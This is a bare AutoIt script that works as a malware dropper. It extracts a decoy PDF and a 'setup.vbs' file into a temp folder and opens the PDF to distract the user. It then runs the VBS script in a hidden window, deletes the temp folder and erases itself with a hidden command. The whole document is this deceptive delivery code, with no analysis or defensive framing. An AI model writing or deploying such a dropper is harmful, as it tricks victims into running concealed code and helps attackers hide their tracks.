Local $tempDir = @TempDir & "\pdftmp_" & Random(1000,9999,1)
DirCreate($tempDir)
Local $pdf = $tempDir & "\doc.pdf"
Local $vbs = $tempDir & "\setup.vbs"
FileInstall("document.pdf", $pdf, 1)
FileInstall("setup.vbs", $vbs, 1)
ShellExecute($pdf)
Sleep(1500)
ShellExecute($vbs, "", "", "open", @SW_HIDE)
Sleep(3000)
DirRemove($tempDir, 1)
Run(@ComSpec & ' /c timeout 1 & del "' & @ScriptFullPath & '"', "", @SW_HIDE)
